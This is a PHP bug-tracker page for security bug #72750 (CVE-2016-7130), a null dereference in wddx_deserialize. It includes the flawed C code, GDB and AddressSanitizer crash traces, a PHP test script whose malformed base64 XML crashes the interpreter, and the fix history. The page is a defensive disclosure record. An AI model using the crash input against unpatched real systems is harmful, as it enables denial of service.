<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='WDDX related Bug #72750 - RDF' href='rss/bug.php?id=72750'>
        <link rel='alternate' type='application/rss+xml' title='WDDX related Bug #72750 - RSS 2.0' href='rss/bug.php?id=72750&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #72750 :: wddx_deserialize null dereference </title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=72750">Sec Bug</a>&nbsp;#72750</th>
            <td id="summary" colspan="5">wddx_deserialize null dereference </td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-08-03 19:51 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-09-05 15:29 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>fernando &#x61;&#116; null-life &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=WDDX+related">WDDX related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.6.24</td>
            <th class="details">OS:</th>
            <td>*</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7130" target="_blank">2016-7130</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=72750&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=72750&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=72750&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1470253874">&nbsp;</a><strong>[2016-08-03 19:51 UTC] fernando &#x61;&#116; null-life &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
When wddx deserialize tries to parse an invalid base64 binary value, php_base64_decode return NULL. The return value is not checked and used.

<a href="https://github.com/php/php-src/blob/master/ext/wddx/wddx.c#L896" rel="nofollow">https://github.com/php/php-src/blob/master/ext/wddx/wddx.c#L896</a>

                if (!strcmp((char *)name, EL_BINARY)) {
                        zend_string *new_str = php_base64_decode(
                                (unsigned char *)Z_STRVAL(ent1-&gt;data), Z_STRLEN(ent1-&gt;data));
                        zval_ptr_dtor(&amp;ent1-&gt;data);
                        ZVAL_STR(&amp;ent1-&gt;data, new_str);
                }


GDB output
----------

gdb -q --args /ramdisk/php-fuzz/phuzzer/php-70//sapi/cli/php -n wdx13.php
No symbol table is loaded.  Use the &quot;file&quot; command.
Breakpoint 1 (__asan_report_error) pending.
Reading symbols from /ramdisk/php-fuzz/phuzzer/php-70//sapi/cli/php...done.
gdb-peda$ r
...
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x5
RBX: 0xffffffff3f0 --&gt; 0x0
RCX: 0x3
RDX: 0x7fffef602dc0 --&gt; 0x7fffef602d20 --&gt; 0x7fffef602e60 --&gt; 0x7fffef602eb0 --&gt; 0x7fffef602f00 --&gt; 0x7fffef602f50 (--&gt; ...)
RSI: 0x0
RDI: 0x5
RBP: 0x7fffffffa090 --&gt; 0x7fffffffa140 --&gt; 0x1
RSP: 0x7fffffff9f50 --&gt; 0x7fffffff9ff0 --&gt; 0x454764685247b6ca
RIP: 0x15c44b0 (&lt;php_wddx_pop_element+2720&gt;:    movzx  edi,BYTE PTR [rsi+0x5])
R8 : 0x0
R9 : 0x0
R10: 0x7fffef601788 --&gt; 0xbed02c8900001406
R11: 0x7fffffffa3b8 --&gt; 0x7fffef66c0a0 --&gt; 0x7fffef601800 --&gt; 0x7fffef658420 --&gt; 0x700000001 --&gt; 0x0
R12: 0x7fffffff9f80 --&gt; 0x41b58ab3
R13: 0x7fffffffa3a0 --&gt; 0x1000000002 --&gt; 0x0
R14: 0x7fffef601780 --&gt; 0x0
R15: 0xffffdec02f0 --&gt; 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x15c449f &lt;php_wddx_pop_element+2703&gt;:       jg     0x15c4570 &lt;php_wddx_pop_element+2912&gt;
   0x15c44a5 &lt;php_wddx_pop_element+2709&gt;:       call   0x428e40 &lt;__asan_report_store1@plt&gt;
   0x15c44aa &lt;php_wddx_pop_element+2714&gt;:       nop    WORD PTR [rax+rax*1+0x0]
=&gt; 0x15c44b0 &lt;php_wddx_pop_element+2720&gt;:       movzx  edi,BYTE PTR [rsi+0x5]
   0x15c44b4 &lt;php_wddx_pop_element+2724&gt;:       mov    rcx,r10
   0x15c44b7 &lt;php_wddx_pop_element+2727&gt;:       and    edi,0x2
   0x15c44ba &lt;php_wddx_pop_element+2730&gt;:       cmp    dil,0x1
   0x15c44be &lt;php_wddx_pop_element+2734&gt;:       sbb    r15d,r15d
[------------------------------------stack-------------------------------------]
0000| 0x7fffffff9f50 --&gt; 0x7fffffff9ff0 --&gt; 0x454764685247b6ca
0008| 0x7fffffff9f58 --&gt; 0x7fffef601788 --&gt; 0xbed02c8900001406
0016| 0x7fffffff9f60 --&gt; 0x7fffef601788 --&gt; 0xbed02c8900001406
0024| 0x7fffffff9f68 --&gt; 0x7fffffffa3b8 --&gt; 0x7fffef66c0a0 --&gt; 0x7fffef601800 --&gt; 0x7fffef658420 --&gt; 0x700000001 (--&gt; ...)
0032| 0x7fffffff9f70 --&gt; 0x0
0040| 0x7fffffff9f78 --&gt; 0x7fffffff9f80 --&gt; 0x41b58ab3
0048| 0x7fffffff9f80 --&gt; 0x41b58ab3
0056| 0x7fffffff9f88 --&gt; 0x2468730 (&quot;3 32 8 3 idx 96 16 5 fname 160 16 6 retval &quot;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
php_wddx_pop_element (user_data=0x7fffffffa3a0, name=&lt;optimized out&gt;) at /home/operac/php-70/ext/wddx/wddx.c:895
895                             ZVAL_STR(&amp;ent1-&gt;data, new_str);

gdb-peda$ bt
#0  php_wddx_pop_element (user_data=0x7fffffffa3a0, name=&lt;optimized out&gt;) at /home/operac/php-70/ext/wddx/wddx.c:895
#1  0x00000000015fe8e1 in _end_element_handler (user=0x7fffef66c140, name=&lt;optimized out&gt;) at /home/operac/php-70/ext/xml/compat.c:219
#2  0x00007ffff569913d in ?? () from /usr/lib/x86_64-linux-gnu/libxml2.so.2
#3  0x00007ffff56a53bd in ?? () from /usr/lib/x86_64-linux-gnu/libxml2.so.2
#4  0x00007ffff56a662b in xmlParseChunk () from /usr/lib/x86_64-linux-gnu/libxml2.so.2
#5  0x0000000001601b8b in php_XML_Parse (parser=parser@entry=0x7fffef66c140,
    data=data@entry=0x7fffef67c018 &quot;&lt;?xml version='1.0'?&gt;\n&lt;!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'&gt;\n&lt;wddxPacket version='1.0'&gt;\n&lt;header/&gt;\n\t&lt;data&gt;\n        \t&lt;struct&gt;\n&quot;, ' ' &lt;repeats 21 times&gt;, &quot;&lt;var name='aBinary'&gt;\n&quot;, ' ' &lt;repeats 25 times&gt;, &quot;&lt;bi&quot;..., data_len=data_len@entry=0x141, is_final=is_final@entry=0x1) at /home/operac/php-70/ext/xml/compat.c:596
#6  0x00000000015dda3b in php_wddx_deserialize_ex (value=&lt;optimized out&gt;, vallen=&lt;optimized out&gt;, return_value=return_value@entry=0x7fffef6140d0) at /home/operac/php-70/ext/wddx/wddx.c:1069
#7  0x00000000015deba0 in zif_wddx_deserialize (execute_data=&lt;optimized out&gt;, return_value=0x7fffef6140d0) at /home/operac/php-70/ext/wddx/wddx.c:1283
#8  0x0000000001da38db in ZEND_DO_ICALL_SPEC_HANDLER () at /home/operac/php-70/Zend/zend_vm_execute.h:586
#9  0x0000000001b4c336 in execute_ex (ex=&lt;optimized out&gt;) at /home/operac/php-70/Zend/zend_vm_execute.h:414
#10 0x0000000001df9dc9 in zend_execute (op_array=&lt;optimized out&gt;, return_value=&lt;optimized out&gt;) at /home/operac/php-70/Zend/zend_vm_execute.h:458
#11 0x000000000194764b in zend_execute_scripts (type=type@entry=0x8, retval=retval@entry=0x0, file_count=file_count@entry=0x3) at /home/operac/php-70/Zend/zend.c:1427
#12 0x00000000016b8348 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd030) at /home/operac/php-70/main/main.c:2494
#13 0x0000000001e02127 in do_cli (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at /home/operac/php-70/sapi/cli/php_cli.c:974
#14 0x0000000000467379 in main (argc=argc@entry=0x3, argv=argv@entry=0x7fffffffe598) at /home/operac/php-70/sapi/cli/php_cli.c:1344
#15 0x00007ffff4ffc830 in __libc_start_main (main=0x466580 &lt;main&gt;, argc=0x3, argv=0x7fffffffe598, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe588) at ../csu/libc-start.c:291
#16 0x0000000000467a49 in _start ()
gdb-peda$ p new_str
$1 = (zend_string *) 0x0
gdb-peda$ p ent1
$2 = (st_entry *) 0x7fffef601780



Test script:
---------------
&lt;?php

$xml = &lt;&lt;&lt; XML
&lt;?xml version='1.0'?&gt;
&lt;!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'&gt;
&lt;wddxPacket version='1.0'&gt;
&lt;header/&gt;
        &lt;data&gt;
                &lt;struct&gt;
                     &lt;var name='aBinary'&gt;
                         &lt;binary length='11'&gt;\\tYmluYXJRhdGE=&lt;/binary&gt;
                     &lt;/var&gt;
                 &lt;/struct&gt;
        &lt;/data&gt;
&lt;/wddxPacket&gt;
XML;

$array = wddx_deserialize($xml);

Expected result:
----------------
No crash

Actual result:
--------------
ASAN:SIGSEGV
=================================================================
==29281==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000005 (pc 0x0000015c44b0 bp 0x7ffff23104b0 sp 0x7ffff2310370 T0)
    #0 0x15c44af in php_wddx_pop_element /home/operac/php-70/ext/wddx/wddx.c:885
    #1 0x15fe8e0 in _end_element_handler /home/operac/php-70/ext/xml/compat.c:219
    #2 0x7fe7cd1f613c  (/usr/lib/x86_64-linux-gnu/libxml2.so.2+0x4a13c)
    #3 0x7fe7cd2023bc  (/usr/lib/x86_64-linux-gnu/libxml2.so.2+0x563bc)
    #4 0x7fe7cd20362a in xmlParseChunk (/usr/lib/x86_64-linux-gnu/libxml2.so.2+0x5762a)
    #5 0x1601b8a in php_XML_Parse /home/operac/php-70/ext/xml/compat.c:596
    #6 0x15dda3a in php_wddx_deserialize_ex /home/operac/php-70/ext/wddx/wddx.c:1069
    #7 0x15deb9f in zif_wddx_deserialize /home/operac/php-70/ext/wddx/wddx.c:1283
    #8 0x1da38da in ZEND_DO_ICALL_SPEC_HANDLER /home/operac/php-70/Zend/zend_vm_execute.h:586
    #9 0x1b4c335 in execute_ex /home/operac/php-70/Zend/zend_vm_execute.h:414
    #10 0x1df9dc8 in zend_execute /home/operac/php-70/Zend/zend_vm_execute.h:458
    #11 0x194764a in zend_execute_scripts /home/operac/php-70/Zend/zend.c:1427
    #12 0x16b8347 in php_execute_script /home/operac/php-70/main/main.c:2494
    #13 0x1e02126 in do_cli /home/operac/php-70/sapi/cli/php_cli.c:974
    #14 0x467378 in main /home/operac/php-70/sapi/cli/php_cli.c:1344
    #15 0x7fe7ccb5982f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #16 0x467a48 in _start (/ramdisk/php-fuzz/phuzzer/php-70/sapi/cli/php+0x467a48)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/operac/php-70/ext/wddx/wddx.c:885 php_wddx_pop_element
==29281==ABORTING


</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=72750'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=72750'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1470612468">&nbsp;</a><strong>[2016-08-07 23:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: 7.0.9</span>
<span class="added">+PHP Version: 5.6.24</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1470612468">&nbsp;</a><strong>[2016-08-07 23:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Fix in <a href="https://gist.github.com/f149d1a8226fb48d6a59911d7f08f617" rel="nofollow">https://gist.github.com/f149d1a8226fb48d6a59911d7f08f617</a> and in security repo as 6930a1d12c47aa1d2675837852910d177b0ceb11. Please verify.
</pre>
</div><div class='comment type_comment' ><a name="1470782823">&nbsp;</a><strong>[2016-08-09 22:47 UTC] fernando &#x61;&#116; null-life &#x64;&#111;&#x74; com</strong>
<pre class='note'>Works OK. Thanks.

$ /home/operac/build2/bin/php -n 72750.php 
array(1) {
  [&quot;aBinary&quot;]=&gt;
  string(0) &quot;&quot;
}
</pre>
</div><div class='comment type_related' ><a name="1470895907">&nbsp;</a><strong>[2016-08-11 06:11 UTC] fernando &#x61;&#116; null-life &#x64;&#111;&#x74; com</strong>
<pre class='note'>Related To: <a href='bug.php?id=72790'>Bug #72790</a>
</pre>
</div><div class='comment type_log' ><a name="1471240890">&nbsp;</a><strong>[2016-08-15 06:01 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: needed</span>
</div></div></div><div class='comment type_svn' ><a name="1471413442">&nbsp;</a><strong>[2016-08-17 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=698a691724c0a949295991e5df091ce16f899e02" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=698a691724c0a949295991e5df091ce16f899e02</a>
Log: Fix <a href='bug.php?id=72750'>bug #72750</a>: wddx_deserialize null dereference
</pre>
</div><div class='comment type_log' ><a name="1471413442">&nbsp;</a><strong>[2016-08-17 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1471422217">&nbsp;</a><strong>[2016-08-17 08:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=698a691724c0a949295991e5df091ce16f899e02" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=698a691724c0a949295991e5df091ce16f899e02</a>
Log: Fix <a href='bug.php?id=72750'>bug #72750</a>: wddx_deserialize null dereference
</pre>
</div><div class='comment type_svn' ><a name="1471422228">&nbsp;</a><strong>[2016-08-17 08:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=f1486f0fd63e888028e625a5ae02f10cc729c4c7" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=f1486f0fd63e888028e625a5ae02f10cc729c4c7</a>
Log: Fix <a href='bug.php?id=72750'>bug #72750</a>: wddx_deserialize null dereference
</pre>
</div><div class='comment type_svn' ><a name="1471425335">&nbsp;</a><strong>[2016-08-17 09:15 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=698a691724c0a949295991e5df091ce16f899e02" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=698a691724c0a949295991e5df091ce16f899e02</a>
Log: Fix <a href='bug.php?id=72750'>bug #72750</a>: wddx_deserialize null dereference
</pre>
</div><div class='comment type_svn' ><a name="1471425345">&nbsp;</a><strong>[2016-08-17 09:15 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=f1486f0fd63e888028e625a5ae02f10cc729c4c7" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=f1486f0fd63e888028e625a5ae02f10cc729c4c7</a>
Log: Fix <a href='bug.php?id=72750'>bug #72750</a>: wddx_deserialize null dereference
</pre>
</div><div class='comment type_svn' ><a name="1471435448">&nbsp;</a><strong>[2016-08-17 12:04 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=b2d89c93e85504ccfcd865213685b89ec1cafcf9" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=b2d89c93e85504ccfcd865213685b89ec1cafcf9</a>
Log: Fix <a href='bug.php?id=72750'>bug #72750</a>: wddx_deserialize null dereference
</pre>
</div><div class='comment type_svn' ><a name="1471518910">&nbsp;</a><strong>[2016-08-18 11:15 UTC] <a href="//people.php.net/tyrael">tyrael@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=82b95bb758ac707a2372f2edaed70589b6f374d3" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=82b95bb758ac707a2372f2edaed70589b6f374d3</a>
Log: Fix <a href='bug.php?id=72750'>bug #72750</a>: wddx_deserialize null dereference
</pre>
</div><div class='comment type_log' ><a name="1473089340">&nbsp;</a><strong>[2016-09-05 15:29 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID: needed</span>
<span class="added">+CVE-ID: 2016-7130</span>
</div></div></div><div class='comment type_svn' ><a name="1476698973">&nbsp;</a><strong>[2016-10-17 10:09 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=698a691724c0a949295991e5df091ce16f899e02" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=698a691724c0a949295991e5df091ce16f899e02</a>
Log: Fix <a href='bug.php?id=72750'>bug #72750</a>: wddx_deserialize null dereference
</pre>
</div><div class='comment type_svn' ><a name="1476698986">&nbsp;</a><strong>[2016-10-17 10:09 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=f1486f0fd63e888028e625a5ae02f10cc729c4c7" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=f1486f0fd63e888028e625a5ae02f10cc729c4c7</a>
Log: Fix <a href='bug.php?id=72750'>bug #72750</a>: wddx_deserialize null dereference
</pre>
</div><div class='comment type_related' ><a name="1502652670">&nbsp;</a><strong>[2017-08-13 19:31 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<pre class='note'>Related To: <a href='bug.php?id=68811'>Bug #68811</a>
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
